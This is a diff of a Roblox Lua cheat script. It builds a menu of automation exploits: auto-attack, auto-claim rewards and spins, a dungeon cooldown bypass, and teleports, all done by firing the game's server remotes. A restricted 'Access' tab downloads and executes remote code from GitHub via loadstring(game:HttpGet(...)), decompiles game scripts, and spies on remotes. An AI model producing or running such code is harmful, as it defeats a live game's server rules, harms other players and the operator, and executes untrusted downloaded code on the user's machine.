+              --game:GetService("ReplicatedStorage")["Remotes"]["HeroUseSkill"]:FireServer({["heroGuid"] = var.hero.guid,["attackType"] = var.hero.index,["userId"] = player.self.UserId,["enemyGuid"] = get:GetAttribute("EnemyGuid")})
+            else
+              game:GetService("ReplicatedStorage")["Remotes"]["PlayerClickAttack"]:FireServer(get:GetAttribute("EnemyGuid"))
+              game:GetService("ReplicatedStorage")["Remotes"]["PlayerRespirationSkillAttack"]:InvokeServer(get:GetAttribute("EnemyGuid"))
+              --game:GetService("ReplicatedStorage")["Remotes"]["HeroUseSkill"]:FireServer({["heroGuid"] = var.hero.guid,["attackType"] = var.hero.index,["userId"] = player.self.UserId,["enemyGuid"] = get:GetAttribute("EnemyGuid")})
+            end
+        end)
+      end --√
+    end
+end)
+
+T1:Toggle("Auto click",false,function(value)
+    var.click = value
+    while wait() do
+      if var.click == false then break end
+      game:GetService("ReplicatedStorage")["Remotes"]["PlayerClickAttack"]:FireServer()
+      game:GetService("ReplicatedStorage")["Remotes"]["PlayerClickAttack"]:FireServer()
+      game:GetService("ReplicatedStorage")["Remotes"]["PlayerClickAttack"]:FireServer()
+    end
+end)
+
+T1:Toggle("Auto claim online rewards",false,function(value)
+    var.on = value
+    while wait() do
+      if var.on == false then break end
+      game:GetService("ReplicatedStorage")["Remotes"]["ClaimOnlineReward"]:InvokeServer({["id"] = "1"})
+      game:GetService("ReplicatedStorage")["Remotes"]["ClaimOnlineReward"]:InvokeServer({["id"] = "2"})
+      game:GetService("ReplicatedStorage")["Remotes"]["ClaimOnlineReward"]:InvokeServer({["id"] = "3"})
+      game:GetService("ReplicatedStorage")["Remotes"]["ClaimOnlineReward"]:InvokeServer({["id"] = "4"})
+      game:GetService("ReplicatedStorage")["Remotes"]["ClaimOnlineReward"]:InvokeServer({["id"] = "5"})
+      game:GetService("ReplicatedStorage")["Remotes"]["ClaimOnlineReward"]:InvokeServer({["id"] = "6"})
+      game:GetService("ReplicatedStorage")["Remotes"]["ClaimOnlineReward"]:InvokeServer({["id"] = "7"})
+      game:GetService("ReplicatedStorage")["Remotes"]["ClaimOnlineReward"]:InvokeServer({["id"] = "8"})
+      game:GetService("ReplicatedStorage")["Remotes"]["ClaimOnlineReward"]:InvokeServer({["id"] = "9"})
+      game:GetService("ReplicatedStorage")["Remotes"]["ClaimOnlineReward"]:InvokeServer({["id"] = "10"})
+      game:GetService("ReplicatedStorage")["Remotes"]["ClaimOnlineReward"]:InvokeServer({["id"] = "11"})
+      game:GetService("ReplicatedStorage")["Remotes"]["ClaimOnlineReward"]:InvokeServer({["id"] = "12"})
+    end
+end)
+
+T1:Toggle("Auto equip best weapon every 1s",false,function(value)
+    var.bw = value
+    if value == true then
+      game:GetService("ReplicatedStorage")["Remotes"]["EquipBestWeapon"]:FireServer()
+    end
+    
+    while wait(1) do
+      if var.bw == false then break end
+      game:GetService("ReplicatedStorage")["Remotes"]["EquipBestWeapon"]:FireServer()
+    end
+end)
+
+T1:Toggle("Auto claim spin tickets",false,function(value)
+    var.cs = value
+    while wait() do
+      if var.cs == false then break end
+      game:GetService("ReplicatedStorage")["Remotes"]["ClaimActivitySpinTicket"]:InvokeServer(1)
+      game:GetService("ReplicatedStorage")["Remotes"]["ClaimActivitySpinTicket"]:InvokeServer(2)
+      game:GetService("ReplicatedStorage")["Remotes"]["ClaimActivitySpinTicket"]:InvokeServer(3)
+      game:GetService("ReplicatedStorage")["Remotes"]["ClaimActivitySpinTicket"]:InvokeServer(4)
+      game:GetService("ReplicatedStorage")["Remotes"]["ClaimActivitySpinTicket"]:InvokeServer(5)
+      game:GetService("ReplicatedStorage")["Remotes"]["ClaimActivitySpinTicket"]:InvokeServer(6)
+      game:GetService("ReplicatedStorage")["Remotes"]["ClaimActivitySpinTicket"]:InvokeServer(7)
+      game:GetService("ReplicatedStorage")["Remotes"]["ClaimActivitySpinTicket"]:InvokeServer(8)
+    end
+end)
+
+T1:Toggle("Auto spin",false,function(value)
+    var.spin = value
+    while wait() do
+      if var.spin == false then break end
+      game:GetService("ReplicatedStorage")["Remotes"]["StartActivitySpin"]:InvokeServer(1)
+    end
+end)
+
+T1:Toggle("Auto ascendant",false,function(value)
+    var.reb = value
+    while wait() do
+      if var.reb == false then break end
+      game:GetService("ReplicatedStorage")["Remotes"]["PlayerReborn"]:FireServer()
+    end
+end)
+
+T1:Toggle("Auto fuse weapon",false,function(value)
+    var.fuse = value
+    while wait() do
+      if var.fuse == false then break end
+      game:GetService("ReplicatedStorage")["Remotes"]["FuseWeapon"]:FireServer()
+    end
+end)
+
+T1:Toggle("Auto collect dropped items",false,function(value)
+    var.bring = value
+    while wait() do
+      if var.bring == false then break end
+      getChildren(workspace.Collects,function(v)
+          --game:GetService("ReplicatedStorage")["Remotes"]["CollectItem"]:InvokeServer(v:GetAttribute("GUID"))
+          lib:CustomTeleport("tween",v,"position")
+      end)
+    end
+end)
+
+T1:Toggle("Auto claim group chest",false,function(value)
+    var.cgroup = value
+    while wait() do
+      if var.cgroup == false then break end
+      game:GetService("ReplicatedStorage")["Remotes"]["ClaimGroupReward"]:InvokeServer()
+    end
+end)
+
+T2:Slider("Hatch amount",1,10,3,function(value)
+    var.egg.id = value
+end)
+
+T2:Toggle("Auto Hatch",false,function(value)
+    var.egg.toggle = value
+    while wait() do
+      if var.egg.toggle == false then break end
+        hatch()
+    end
+end)
+
+T2:Toggle("Auto equip best hero every 1s",false,function(value)
+    var.bh = value
+    if value == true then
+      game:GetService("ReplicatedStorage")["Remotes"]["AutoEquipBestHero"]:FireServer()
+    end
+    
+    while wait(1) do
+      if var.bh == false then break end
+      game:GetService("ReplicatedStorage")["Remotes"]["AutoEquipBestHero"]:FireServer()
+    end
+end)
+
+local client = {
+  near = true,
+  range = 25,
+  name = "null",
+  lock = false
 }
 
-Window:SelectTab(Tabs.MainFarm)
+T3:Slider("kill range",0,500,25,function(value)
+    client.range = value
+end)
 
-local function AddToggle(Tab, Settings, Flag)
-  Settings.Description = type(Settings[2]) == "string" and Settings[2]
-  Settings.Default = type(Settings[2]) ~= "string" and Settings[2]
-  Settings.Flag = Settings.Flag or Flag
-  Settings.Callback = function(Value) _env[Settings.Flag] = Value end
-  Tab:AddToggle(Settings)
-end
+T3:Textbox("Insert enemy name [ disable nearest ]",false,function(value)
+    client.name = value
+end)
 
-local _Discord = Tabs.Discord do
-  _Discord:AddDiscordInvite({
-    Name = "BRUTALITY HUB V4",
-    Description = "Join our discord community to receive information about the next update",
-    Logo = "rbxassetid://107679910024355",
-    Invite = "https://discord.gg/brutality-hub-1182005198206545941"
-  })
-  _Discord:AddDiscordInvite({
-    Name = "Subscribe Youtube",
-    Description = "Please subscribe for get notify update script",
-    Logo = "rbxassetid://107679910024355",
-    Invite = "www.youtube.com/@medusascriptroblox"
-  })
-  end
+T3:Toggle("Nearest system",true,function(value)
+    client.near = value
+end)
 
-local _MainFarm = Tabs.MainFarm do
-  _MainFarm:AddDropdown({"Farm Tool", Loaded.WeaponsList, Settings.ToolFarm, function(Value)
-    Settings.ToolFarm = Value
-  end, "Main/FarmTool"})
-  _MainFarm:AddSection("Farm")
-  AddToggle(_MainFarm, {"Auto Farm Level", ("MaxLevel: %i"):format(MSetting.Setting.MaxLevel)}, "Level Farm")
-  AddToggle(_MainFarm, {"Auto Farm Nearest"}, "Nearest Farm")
-  _MainFarm:AddSection("Enemies")
-  _MainFarm:AddDropdown({"Select Enemie", Loaded.EnemeiesList, {Loaded.EnemeiesList[1]}, function(Value)
-    _env.SelecetedEnemie = Value
-  end, "Main/SEnemy"})
-  AddToggle(_MainFarm, {"Auto Farm Selected"}, "FS Enemie")
-  AddToggle(_MainFarm, {"Take Quest [ Enemie Selected ]", true}, "FS Take Quest")
-  _MainFarm:AddSection("Boss Farm")
-  AddToggle(_MainFarm, {"Auto Meme Beast [ Spawns every 30 Minutes ]", "Drops: Portal ( <25% ), Meme Cube ( <50% )"}, "Meme Beast")
-  _MainFarm:AddSection("Raid")
-  AddToggle(_MainFarm, {"Auto Farm Raid", "Req: Level 1000"}, "Raid Farm")
-end
+T3:Toggle("Target enemy [ For Hero ]",false,function(value)
+    client.lock = value
+end)
 
-local _Items = Tabs.Items do
-  _Items:AddSection("Powers")
-  _Items:AddButton({"Reroll Powers 10X [ 250k Money ]", function()
-    OtherEvent.MainEvents.Modules:FireServer("Random_Power", {
-      Type = "Decuple",
-      NPCName = "Floppa Gacha",
-      GachaType = "Money"
-    })
-  end})
-  _Items:AddToggle({"Auto Store Powers", false, function(Value)
-    _env.AutoStorePowers = Value
-    while _env.AutoStorePowers do _wait()
-      for _,v in ipairs(Player.Backpack:GetChildren()) do
-        if v:IsA("Tool") and v.ToolTip == "Power" and v:GetAttribute("Using") == nil then
-          v.Parent = Player.Character
-          OtherEvent.MainEvents.Modules:FireServer("Eatable_Power", { Action = "Store", Tool = v })
-        end
+T3:Toggle("Auto attack",false,function(value)
+    var.atk = value
+    while wait() do
+      if var.atk == false then break end
+      getChildren(workspace["Enemys"],function(array)
+          if client.near == true then
+            if (player.self.Character.HumanoidRootPart.Position - array.HumanoidRootPart.Position).Magnitude < client.range then
+              if client.lock == true then
+                game:GetService("ReplicatedStorage")["Remotes"]["PlayerClickAttack"]:FireServer(array:GetAttribute("EnemyGuid"))
+                game:GetService("ReplicatedStorage")["Remotes"]["ClickEnemy"]:InvokeServer(array:GetAttribute("EnemyGuid"))
+                game:GetService("ReplicatedStorage")["Remotes"]["PlayerRespirationSkillAttack"]:InvokeServer(array:GetAttribute("EnemyGuid"))
+                --game:GetService("ReplicatedStorage")["Remotes"]["HeroUseSkill"]:FireServer({["heroGuid"] = var.hero.guid,["attackType"] = var.hero.index,["userId"] = player.self.UserId,["enemyGuid"] = array:GetAttribute("EnemyGuid")})
+              else
+                game:GetService("ReplicatedStorage")["Remotes"]["PlayerClickAttack"]:FireServer(array:GetAttribute("EnemyGuid"))
+                game:GetService("ReplicatedStorage")["Remotes"]["PlayerRespirationSkillAttack"]:InvokeServer(array:GetAttribute("EnemyGuid"))
+                --game:GetService("ReplicatedStorage")["Remotes"]["HeroUseSkill"]:FireServer({["heroGuid"] = var.hero.guid,["attackType"] = var.hero.index,["userId"] = player.self.UserId,["enemyGuid"] = array:GetAttribute("EnemyGuid")})
+              end
+            end
+          else
+            if (string.sub(string.lower(array.Name),1,string.len(client.name))) == string.lower(client.name) then
+              if client.lock == true then
+                game:GetService("ReplicatedStorage")["Remotes"]["PlayerClickAttack"]:FireServer(array:GetAttribute("EnemyGuid"))
+                game:GetService("ReplicatedStorage")["Remotes"]["ClickEnemy"]:InvokeServer(array:GetAttribute("EnemyGuid"))
+                game:GetService("ReplicatedStorage")["Remotes"]["PlayerRespirationSkillAttack"]:InvokeServer(array:GetAttribute("EnemyGuid"))
+                --game:GetService("ReplicatedStorage")["Remotes"]["HeroUseSkill"]:FireServer({["heroGuid"] = var.hero.guid,["attackType"] = var.hero.index,["userId"] = player.self.UserId,["enemyGuid"] = array:GetAttribute("EnemyGuid")})
+              else
+                game:GetService("ReplicatedStorage")["Remotes"]["PlayerClickAttack"]:FireServer(array:GetAttribute("EnemyGuid"))
+                game:GetService("ReplicatedStorage")["Remotes"]["PlayerRespirationSkillAttack"]:InvokeServer(array:GetAttribute("EnemyGuid"))
+                --game:GetService("ReplicatedStorage")["Remotes"]["HeroUseSkill"]:FireServer({["heroGuid"] = var.hero.guid,["attackType"] = var.hero.index,["userId"] = player.self.UserId,["enemyGuid"] = array:GetAttribute("EnemyGuid")})
+              end
+            end
+          end
+      end)
+    end
+end)
+
+T3:Toggle("Fast attack [ Hero ]",false,function(value)
+    var.hero.ft = value
+    while wait() do
+      if var.hero.ft == false then break end
+      if var.hero.guid ~= "null" then
+        game:GetService("ReplicatedStorage")["Remotes"]["HeroSkillHarm"]:FireServer({["harmIndex"] = var.hero.index,["isSkill"] = var.hero.skill,["heroGuid"] = var.hero.guid,["skillId"] = var.hero.id})
+        game:GetService("ReplicatedStorage")["Remotes"]["RespirationSkillHarm"]:FireServer({["harmIndex"] = var.hero.index,["skillId"] = var.hero.id})
+        --game:GetService("ReplicatedStorage")["Remotes"]["HeroUseSkill"]:FireServer({["heroGuid"] = var.hero.guid,["attackType"] = var.hero.index,["userId"] = player.self.UserId,["enemyGuid"] = array:GetAttribute("EnemyGuid")})
+      else
+        lib:notify(lib:ColorFonts("GUID is null, make ur hero attack one enemy","Red"),10)
+        var.hero.ft = false
       end
     end
-  end, "AutoStore"})
-  _Items:AddSection("Aura Color")
-  _Items:AddButton({"Reroll Aura Color [ 10 Gems ]", function()
-    OtherEvent.MainEvents.Modules:FireServer("Reroll_Color", "Halfed Sorcerer")
-  end})
-  _Items:AddSection("Bosses")
-  AddToggle(_Items, {"Auto Giant Pumpkin", "Drops: Pumpkin Head ( <10% ), Nugget Man ( <25% )"}, "Giant Pumpkin")
-  AddToggle(_Items, {"Auto Evil Noob", "Drops: Yellow Blade ( <5% ), Noob Friend ( <10% )"}, "Evil Noob")
-  AddToggle(_Items, {"Auto Lord Sus", "Drops: Purple Sword ( <5% ), Sus Pals ( <10% )"}, "Lord Sus")
-  _Items:AddSection("Race")
-  AddToggle(_Items, {"Auto Awakening Orb", "Req: Level 500"}, "Race V2 Orb")
-  _Items:AddSection("Weapons")
-  AddToggle(_Items, {"Auto Floppa [ Exclusive Sword ]"}, "_Floppa Sword")
-  _Items:AddSection("Popcat")
-  _Items:AddToggle({"Auto Popcat", false, function(Value)
-    _env.AutoPopcat = Value
-    local ClickDetector = Island.FloppaIsland.Popcat_Clickable.Part.ClickDetector
-    local Heartbeat = RunService.Heartbeat
-    if Value then GoTo(CFrame_new(400, -37, -588)) end
-    
-    while _env.AutoPopcat do Heartbeat:Wait()
-      fireclickdetector(ClickDetector)
-    end
-  end, "AutoPopcat"})
-end
+end)
 
-local _Stats = Tabs.Stats do
-  local StatsName, SelectedStats = {
-    ["Power"] = "MemePowerLevel", ["Health"] = "DefenseLevel",
-    ["Weapon"] = "SwordLevel", ["Melee"] = "MeleeLevel"
-  }, {}
+T3:Toggle("Auto attack all rendered enemies",false,function(value)
+    var.atk3 = value
+    while wait() do
+      if var.atk3 == false then break end
+      getChildren(workspace["Enemys"],function(array)
+          if client.lock == true then
+              game:GetService("ReplicatedStorage")["Remotes"]["PlayerClickAttack"]:FireServer(array:GetAttribute("EnemyGuid"))
+              game:GetService("ReplicatedStorage")["Remotes"]["ClickEnemy"]:InvokeServer(array:GetAttribute("EnemyGuid"))
+              game:GetService("ReplicatedStorage")["Remotes"]["PlayerRespirationSkillAttack"]:InvokeServer(array:GetAttribute("EnemyGuid"))
+              --game:GetService("ReplicatedStorage")["Remotes"]["HeroUseSkill"]:FireServer({["heroGuid"] = var.hero.guid,["attackType"] = var.hero.index,["userId"] = player.self.UserId,["enemyGuid"] = array:GetAttribute("EnemyGuid")})
+          else
+              game:GetService("ReplicatedStorage")["Remotes"]["PlayerClickAttack"]:FireServer(array:GetAttribute("EnemyGuid"))
+              game:GetService("ReplicatedStorage")["Remotes"]["PlayerRespirationSkillAttack"]:InvokeServer(array:GetAttribute("EnemyGuid"))
+              --game:GetService("ReplicatedStorage")["Remotes"]["HeroUseSkill"]:FireServer({["heroGuid"] = var.hero.guid,["attackType"] = var.hero.index,["userId"] = player.self.UserId,["enemyGuid"] = array:GetAttribute("EnemyGuid")})
+          end
+      end)
+    end
+end)
+--[[T4:Textbox("Insert weapon GUID",false,function(value)
+    var.forge.guid = value
+end)
+]]
+
+T4:Toggle("Auto forge weapon [ Anti failure ]",false,function(value)
+    var.forge.toggle = value
+    while wait() do
+      if var.forge.toggle == false then break end
+      if var.forge.guid ~= "null" then
+        game:GetService("ReplicatedStorage")["Remotes"]["ForgeWeapon"]:InvokeServer(var.forge.guid)
+      else
+        lib:notify(lib:ColorFonts("pls equip the weapon first. [ Missing-GUID ]","Red"),10)
+        var.forge.toggle = false
+      end
+    end
+end)
+--Id nya achmadrinaldi
+
+T5:Dropdown("Select map ID",{"50001","50002","50003","50004","50005","50006","50007","50008","50009","50010","50011","50012","50013","50014","50015"},function(value)
+    var.mapid = tonumber(value)
+end)
+
+T5:Button("Teleport to a selected map",function()
+    game:GetService("ReplicatedStorage")["Remotes"]["LocalPlayerTeleport"]:FireServer({["mapId"] = var.mapid})
+end)
+
+T5:Button("Join dungeon [ Bypass cooldown ]",function()
+    game:GetService("ReplicatedStorage")["Remotes"]["LocalPlayerTeleport"]:FireServer({["mapId"] = 50016})
+end)
+
+T5:Toggle("Auto open daily chest [ in selected map ]",false,function(value)
+    var.dc = value
+    while wait() do
+      if var.dc == false then break end
+      getChildren(workspace["Maps"],function(i)
+          getChildren(i["Map"]["Box"],function(get)
+              game:GetService("ReplicatedStorage")["Remotes"]["GetBoxGift"]:FireServer({["mapId"] = var.mapid,["pointId"] = get.Name})
+          end)
+      end)
+    end
+end)
+
+if player.self.Name == "achmadrinaldi" or player.self.Name == "Rivanda_Cheater" then
+local T99 = wndw:Tab("Access",true)
   
-  _Stats:AddSlider({"Select Points", 1, 100, Settings.AutoStats_Points, 1, function(Value)
-    Settings.AutoStats_Points = Value
-  end, "Stats/SelectPoints"})
-  _Stats:AddToggle({"Auto Stats", false, function(Value)
-    _env.AutoStats = Value
-    local _Points = PlayerData.SkillPoint
-    while _env.AutoStats do _wait(0.5)
-      for _,Stats in pairs(SelectedStats) do
-        local _p, _s = _Points.Value, PlayerData[StatsName[_]]
-        if Stats and _p > 0 and _s.Value < MSetting.Setting.MaxLevel then
-          OtherEvent.MainEvents.StatsFunction:InvokeServer({
-            ["Target"] = StatsName[_],
-            ["Action"] = "UpgradeStats",
-            ["Amount"] = math.clamp(Settings.AutoStats_Points, 0, MSetting.Setting.MaxLevel - _s.Value)
-          })
-        end
+T99:Button("Remote spy",function()
+      lib:RemoteSpy()
+end)
+
+T99:Button("Dex [ PUBLIC ]",function()
+      if var.alre == false then
+        var.alre = true
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/dex.lua"))()
+      else
+        lib:notify(lib:ColorFonts("Alr executed","Red"),10)
       end
-    end
-  end})
-  _Stats:AddSection("Select Stats")
-  for _,v in next, StatsName do
-    _Stats:AddToggle({_, false, function(Value)
-      SelectedStats[_] = Value
-    end, "Stats_" .. _})
-  end
-end
-
-local _Teleport = Tabs.Teleport do
-  _Teleport:AddSection("Teleport")
-  _Teleport:AddDropdown({"Islands", Location:WaitForChild("SpawnLocations"):GetChildren(), {}, function(Value)
-    GoTo(Location.SpawnLocations[Value].CFrame)
-  end})
-  _Teleport:AddDropdown({"Quests", Location:WaitForChild("QuestLocaion"):GetChildren(), {}, function(Value)
-    GoTo(Location.QuestLocaion[Value].CFrame)
-  end})
-end
-
-local _Shop = Tabs.Shop do
-  _Shop:AddSection("Auto Buy")
-  _Shop:AddToggle({"Auto Buy Abilities", false, function(Value)
-    _env.AutoBuyAbility = Value
-    while _env.AutoBuyAbility do  _wait(1)
-      if not Funcs:AbilityUnlocked("Instinct") and Funcs:CanBuy("Instinct") then
-        OtherEvent.MainEvents.Modules:FireServer("Ability_Teacher", "Nugget Man")
-      elseif not Funcs:AbilityUnlocked("FlashStep") and Funcs:CanBuy("FlashStep") then
-        OtherEvent.MainEvents.Modules:FireServer("Ability_Teacher", "Giga Chad")
-      elseif not Funcs:AbilityUnlocked("Aura") and Funcs:CanBuy("Aura") then
-        OtherEvent.MainEvents.Modules:FireServer("Ability_Teacher", "Aura Master")
-      else wait(3) end
-    end
-  end, "Auto Buy Ability", Desc = "Aura, Instinct & Flash Step"})
+end)
   
-  for _,s in next, Loaded.Shop do
-    _Shop:AddSection({s[1]})
-    for _,item in pairs(s[2]) do
-      local buyfunc = item[3]
-      if type(buyfunc) == "table" then
-        buyfunc = function()
-          OtherEvent.MainEvents.Modules:FireServer(unpack(item[3]))
+T99:Button("Turtle Instance Viewer [ PUBLIC ]",function()
+local Iris = loadstring(game:HttpGet("https://raw.githubusercontent.com/x0581/Iris-Exploit-Bundle/main/bundle.lua"))().Init(cg)
+local PropertyAPIDump = game.HttpService:JSONDecode(game:HttpGet("https://anaminus.github.io/rbx/json/api/latest.json"))
+
+local function GetPropertiesForInstance(Instance)
+    local Properties = {}
+    for i,v in next, PropertyAPIDump do
+        if v.Class == Instance.ClassName and v.type == "Property" then
+            pcall(function()
+                Properties[v.Name] = {
+                    Value = Instance[v.Name],
+                    Type = v.ValueType,
+                }
+            end)
+        end
+    end
+    return Properties
+end
+
+local ScriptContent = [[]]
+local SelectedInstance = nil
+local Properties = {}
+
+local function CrawlInstances(Inst)
+    for _, Instance in next, Inst:GetChildren() do
+        local InstTree = Iris.Tree({Instance.Name})
+
+        Iris.SameLine() do
+            if Instance:IsA("LocalScript") or Instance:IsA("ModuleScript") then
+                if Iris.SmallButton({"View Script"}).clicked then
+                    ScriptContent = decompile(Instance)
+                end
+            end
+            if Iris.SmallButton({"View and Copy Properties"}).clicked then
+                SelectedInstance = Instance
+                Properties = GetPropertiesForInstance(Instance)
+                setclipboard(SelectedInstance and SelectedInstance:GetFullName() or "UNKNOWN INSTANCE")
+                lib:notify("Copied to the clipboard",10)
+            end
+            Iris.End()
+        end
+
+        if InstTree.state.isUncollapsed.value then
+            CrawlInstances(Instance)
+        end
+        Iris.End()
+    end
+end
+
+Iris:Connect(function()
+    local InstanceViewer = Iris.State(false)
+    local PropertyViewer = Iris.State(false)
+    local ScriptViewer = Iris.State(false)
+    local CopyProp = Iris.State(false)
+
+    Iris.Window({"Turtle Explorer Settings", [Iris.Args.Window.NoResize] = true}, {size = Iris.State(Vector2.new(400, 75)), position = Iris.State(Vector2.new(0, 0))}) do
+        Iris.SameLine() do
+            Iris.Checkbox({"Instance Viewer"}, {isChecked = InstanceViewer})
+            Iris.Checkbox({"Property Viewer"}, {isChecked = PropertyViewer})
+            Iris.Checkbox({"Script Viewer"}, {isChecked = ScriptViewer})
+            Iris.End()
+        end
+        Iris.End()
+    end
+
+    if InstanceViewer.value then
+        Iris.Window({"Turtle Explorer Instance Viewer", [Iris.Args.Window.NoClose] = true}, {size = Iris.State(Vector2.new(400, 300)), position = Iris.State(Vector2.new(0, 75))}) do
+            CrawlInstances(game)
+            Iris.End()
+        end
+    end
+
+    if PropertyViewer.value then
+        Iris.Window({"Turtle Explorer Property Viewer", [Iris.Args.Window.NoClose] = true}, {size = Iris.State(Vector2.new(400, 200)), position = Iris.State(Vector2.new(0, 375))}) do
+            Iris.Text({("Viewing Properties For: %s"):format(
+                SelectedInstance and SelectedInstance:GetFullName() or "UNKNOWN INSTANCE"
+            )})
+            Iris.Table({3, [Iris.Args.Table.RowBg] = true}) do
+                for PropertyName, PropDetails in next, Properties do
+                    Iris.Text({PropertyName})
+                    Iris.NextColumn()
+                    Iris.Text({PropDetails.Type})
+                    Iris.NextColumn()
+                    Iris.Text({tostring(PropDetails.Value)})
+                    Iris.NextColumn()
+                end
+                Iris.End()
+            end
+        end
+        Iris.End()
+    end
+
+    if ScriptViewer.value then
+        Iris.Window({"Turtle Explorer Script Viewer", [Iris.Args.Window.NoClose] = true}, {size = Iris.State(Vector2.new(600, 575)), position = Iris.State(Vector2.new(400, 0))}) do
+            if Iris.Button({"Copy Script"}).clicked then
+                setclipboard(ScriptContent)
+                lib:notify("Copied to the clipboard",10)
+            end
+            local Lines = ScriptContent:split("\n")
+            for I, Line in next, Lines do
+                Iris.Text({Line})
+            end
+            Iris.End()
+        end
+    end
+end)
+end)
+
+--[[T99:Button("Run LS Decompiler [ Vanguard ]",function()
+      lib:notify(lib:ColorFonts("You're not developer or staff.","Red"),30)
+end)
+
+T99:Button("Run LocalScript Leaker [ Vanguard ]",function()
+      lib:notify(lib:ColorFonts("You're not developer or staff.","Red"),30)
+end)
+
+T99:Button("Run Hidden remote execution [ Vanguard ]",function()
+      lib:notify(lib:ColorFonts("You're not developer or staff.","Red"),30)
+end)
+
+T99:Toggle("Open Vanguard system manager",false,function(value)
+      if value == true then
+        lib:notify(lib:ColorFonts("You're not developer or staff.","Red"),30)
+      end
+end)
+
+T99:Toggle("Open Turtle Panel",false,function(value)
+      if value == true then
+        lib:notify(lib:ColorFonts("You're not developer or staff.","Red"),30)
+      end
+end)
+
+T99:Toggle("Open AI panel",false,function(value)
+      if value == true then
+        lib:notify(lib:ColorFonts("You're not developer or staff.","Red"),30)
+      end
+end)
+
+T99:Toggle("Open LocalScript manager",false,function(value)
+      if value == true then
+        lib:notify(lib:ColorFonts("You're not developer or staff.","Red"),30)
+      end
+end)
+
+T99:Toggle("Sent a message when success",false,function(value)
+      if value == true then
+        lib:notify(lib:ColorFonts("You're not developer or staff.","Red"),30)
+      end
+end)
+  
+T99:Toggle("High damage [ Config ]",false,function(value)
+      lib:notify(lib:ColorFonts('{"title":"Authorized failed","desc":"Ur ID and Username does not match..."}',"Red"),30)
+end)
+  
+T99:Button("Infinity all currency",function()
+      lib:notify(lib:ColorFonts('{"title":"Authorized failed","desc":"Ur ID and Username does not match..."}',"Red"),30)
+end)
+
+T99:Toggle("Give OP/Robux pet and items",false,function(value)
+      lib:notify(lib:ColorFonts('{"title":"Authorized failed","desc":"Ur ID and Username does not match..."}',"Red"),30)
+end)
+
+T99:Toggle("Instant kill [ LAGGY ]",false,function(value)
+      lib:notify(lib:ColorFonts('{"title":"Authorized failed","desc":"Ur ID and Username does not match..."}',"Red"),30)
+end)
+
+T99:Toggle("Infinite equips",false,function(value)
+      lib:notify(lib:ColorFonts('{"title":"Authorized failed","desc":"Ur ID and Username does not match..."}',"Red"),30)
+end)
+
+T99:Toggle("Auto modded LocalScript with Vanguard API",false,function(value)
+      lib:notify(lib:ColorFonts('{"title":"Authorized failed","desc":"Ur ID and Username does not match..."}',"Red"),30)
+end)
+
+T99:Toggle("Auto attack nearest enemy [ Hero ]",false,function(value)
+      lib:notify(lib:ColorFonts('{"title":"Authorized failed","desc":"Ur ID and Username does not match..."}',"Red"),30)
+end)
+
+T99:Toggle("Instant anti-failure",false,function(value)
+      lib:notify(lib:ColorFonts('{"title":"Authorized failed","desc":"Ur ID and Username does not match..."}',"Red"),30)
+end)
+lib:CheckServers(3,function(vuln)
+  if vuln == true then
+  lib:Serverhop(3)
+end
+end)
+lib:rejoin() 
+  ]]
+T99:Button("Teleport to lower server",function()
+      lib:CheckServers(4,function(vuln)
+          if vuln == true then
+            lib:Serverhop(4)
+          else
+            lib:notify(lib:ColorFonts("Failed to teleport. #ERROR_OCCURED","Red"),10)
+          end
+      end)
+end)
+
+T99:Button("Rejoin",function()
+      lib:rejoin()
+end)
+
+local T100 = wndw:Tab("Remote Finder",true)
+local lab = T100:Label(var.remote.list)
+  
+T100:Dropdown("Target detection",{"Workspace","ReplicatedStorage","Players"},function(value)
+      var.remote.target = value
+end)
+
+T100:Dropdown("Remote type",{"BindableEvent","BindableFunction","RemoteEvent","RemoteFunction","LocalScript","ModuleScript"},function(value)
+      var.remote.class = value
+end)
+
+T100:Button("Start detect",function()
+      lab:EditLabel("Loading... 'require()'")
+      wait(1)
+      var.remote.list = ""
+      for i,v in pairs(game:GetService(var.remote.target):GetDescendants()) do
+        if v:IsA(var.remote.class) then
+          if var.remote.class == "BindableEvent" then
+            var.remote.list = var.remote.list .. "\n" .. lib:ColorFonts(v.Parent.Name .. "." .. v.Name,"Red") .. ":" .. lib:ColorFonts("Fire()","Yellow")
+          elseif var.remote.class == "BindableFunction" then
+            var.remote.list = var.remote.list .. "\n" .. lib:ColorFonts(v.Parent.Name .. "." .. v.Name,"Red") .. ":" .. lib:ColorFonts("Invoke()","Blue")
+          elseif var.remote.class == "RemoteEvent" then
+            var.remote.list = var.remote.list .. "\n" .. lib:ColorFonts(v.Parent.Name .. "." .. v.Name,"Red") .. ":" .. lib:ColorFonts("FireServer()","Yellow")
+          elseif var.remote.class == "RemoteFunction" then
+            var.remote.list = var.remote.list .. "\n" .. lib:ColorFonts(v.Parent.Name .. "." .. v.Name,"Red") .. ":" .. lib:ColorFonts("InvokeServer()","Blue")
+          elseif var.remote.list == "LocalScript" then
+            var.remote.list = var.remote.list .. "\n" .. lib:ColorFonts(v.Parent.Name .. "." .. v.Name,"Red") .. " -> " .. lib:ColorFonts("LocalScript","Green")
+          elseif var.remote.list == "ModuleScript" then
+            var.remote.list = var.remote.list .. "\n" .. lib:ColorFonts(v.Parent.Name .. "." .. v.Name,"Red") .. " -> " .. lib:ColorFonts("ModuleScript","Green")
+          end
         end
       end
-      
-      _Shop:AddButton({item[1], buyfunc, Desc = item[2]})
+      lab:EditLabel(var.remote.list)
+end)
+
+end
+
+--[[T3:Toggle("Receive task - TESTING",false,function(value)
+    var.task.ach = value
+    while wait() do
+      if var.task.ach == false then break end
+      game:GetService("ReplicatedStorage")["Remotes"]["ReceiveTask"]:FireServer(var.task.id + 1)
     end
-  end
-end
+end)
+(string.sub(string.lower(v.Name),1,string.len(value))) == string.lower(value)
+]]
 
-local _Misc = Tabs.Misc do
-  _Misc:AddButton({"Redeem All Codes", Funcs.RAllCodes})
-  _Misc:AddSection("Settings")
-  _Misc:AddSlider({"Farm Distance", 5, 15, 1, 8, function(Value)
-    Settings.FarmDistance = Value or 8
-    Settings.FarmCFrame = CFrame_new(0, Value or 8, 0) * CFrame_Angles(math.rad(-90), 0, 0)
-  end, "Farm Distance"})
-  _Misc:AddToggle({"Auto Aura", Settings.AutoHaki, function(Value) Settings.AutoHaki = Value end, "Auto Haki"})
-  _Misc:AddToggle({"Auto Attack", Settings.AutoClick, function(Value) Settings.AutoClick = Value end, "Auto Attack"})
-  _Misc:AddToggle({"Bring Mobs", Settings.BringMobs, function(Value) Settings.BringMobs = Value end, "Bring Mobs"})
